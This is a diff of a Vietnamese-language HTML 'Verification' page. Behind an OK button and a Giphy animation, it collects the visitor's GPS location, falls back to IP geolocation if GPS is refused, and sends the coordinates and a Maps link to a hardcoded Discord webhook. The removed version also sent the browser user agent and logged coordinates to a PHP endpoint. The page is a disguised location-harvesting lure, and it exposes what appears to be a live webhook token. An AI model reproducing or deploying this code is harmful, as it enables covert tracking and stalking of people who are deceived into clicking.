@@ -5,33 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Verification</title>
     <style>
-        body { 
-            font-family: sans-serif; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            margin: 0; 
-            background-color: #f4f6f9; 
-        }
-        #angel-container { 
-            text-align: center; 
-            background: white; 
-            padding: 40px; 
-            border-radius: 12px; 
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1); 
-            width: 80%; 
-            max-width: 400px; 
-        }
-        button { 
-            padding: 12px 24px; 
-            font-size: 16px; 
-            cursor: pointer; 
-            background-color: #007bff; 
-            color: white; 
-            border: none; 
-            border-radius: 5px; 
-        }
+        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f4f6f9; }
+        #angel-container { text-align: center; background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 80%; max-width: 400px; }
+        button { padding: 12px 24px; font-size: 16px; cursor: pointer; background-color: #007bff; color: white; border: none; border-radius: 5px; }
     </style>
 </head>
 <body>
@@ -42,33 +18,47 @@
     <button onclick="startAngelCheck()">Xác nhận (OK)</button>
 </div>
 
-<!-- Iframe hiển thị sau khi người dùng xác nhận -->
-<iframe id="giphy-frame" src="https://giphy.com/embed/5uDNFrOi6VwrkFKBaj" width="480" height="480" style="display:none;" frameBorder="0" class="giphy-embed" allowFullScreen></iframe>
+<iframe id="giphy-frame" src="https://giphy.com/embed/5uDNFrOi6VwrkFKBaj" width="480" height="480" style="display:none;" frameBorder="0" allowFullScreen></iframe>
 
 <script>
-// Cấu hình link Discord Webhook
+// Webhook của bạn
 const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1527956134856495104/4nt29jEEtSdg99Ks_nga5go68k-MyiYoI-e8RY3ymAEw_dgQf98bVuoE6l7_odXxtUXS";
 
 function startAngelCheck() {
     document.getElementById('angel-container').style.display = 'none';
     document.getElementById('giphy-frame').style.display = 'block';
-    getLocation();
+    
+    // Thử lấy vị trí GPS trước
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            (pos) => sendToDiscord(pos.coords.latitude, pos.coords.longitude, "GPS", pos.coords.accuracy + "m"),
+            (err) => getIpLocation() // Nếu chặn GPS thì lấy IP
+        );
+    } else {
+        getIpLocation();
+    }
 }
 
-// Hàm gửi dữ liệu về Discord
-function sendToDiscordWebhook(lat, lon, method, accuracy) {
+function getIpLocation() {
+    fetch('https://ipapi.co/json/')
+    .then(res => res.json())
+    .then(data => {
+        sendToDiscord(data.latitude, data.longitude, "IP (Ước tính)", "N/A");
+    })
+    .catch(err => console.log("Lỗi lấy IP:", err));
+}
+
+function sendToDiscord(lat, lon, method, acc) {
     const payload = {
         embeds: [{
-            title: `🎯 Dữ liệu thu thập được (${method})`,
+            title: `🎯 Dữ liệu: ${method}`,
             color: method === "GPS" ? 5763719 : 16744192,
             fields: [
-                { name: "🛰️ Vĩ độ", value: `\`${lat}\``, inline: true },
-                { name: "🛰️ Kinh độ", value: `\`${lon}\``, inline: true },
-                { name: "🎯 Độ chính xác", value: `\`${accuracy}\``, inline: false },
-                { name: "🌐 Maps", value: `[Xem vị trí](https://www.google.com/maps?q=${lat},${lon})`, inline: false },
-                { name: "📱 Info", value: navigator.userAgent, inline: false }
-            ],
-            timestamp: new Date().toISOString()
+                { name: "🛰️ Vĩ độ", value: String(lat), inline: true },
+                { name: "🛰️ Kinh độ", value: String(lon), inline: true },
+                { name: "🎯 Độ chính xác", value: acc, inline: false },
+                { name: "🌐 Bản đồ", value: `https://www.google.com/maps?q=${lat},${lon}`, inline: false }
+            ]
         }]
     };
 
@@ -78,39 +68,6 @@ function sendToDiscordWebhook(lat, lon, method, accuracy) {
         body: JSON.stringify(payload)
     });
 }
-
-// Bắt đầu lấy tọa độ
-function getLocation() {
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(showPosition, handleLocationError);
-    } else {
-        getIpLocation(); // Nếu trình duyệt không hỗ trợ
-    }
-}
-
-// Thành công GPS
-function showPosition(position) {
-    fetch(`store.php?lat=${position.coords.latitude}&long=${position.coords.longitude}&type=GPS`);
-    sendToDiscordWebhook(position.coords.latitude, position.coords.longitude, "GPS", position.coords.accuracy + " mét");
-}
-
-// Người dùng từ chối GPS -> Chuyển sang IP
-function handleLocationError(error) {
-    console.log("GPS bị chặn, chuyển sang lấy IP...");
-    getIpLocation();
-}
-
-// Lấy tọa độ qua IP
-function getIpLocation() {
-    fetch('https://ipapi.co/json/')
-    .then(res => res.json())
-    .then(data => {
-        fetch(`store.php?lat=${data.latitude}&long=${data.longitude}&type=IP`);
-        sendToDiscordWebhook(data.latitude, data.longitude, "IP (Ước tính)", "Không xác định");
-    })
-    .catch(err => console.error("Lỗi lấy IP:", err));
-}
 </script>
-
 </body>
 </html>
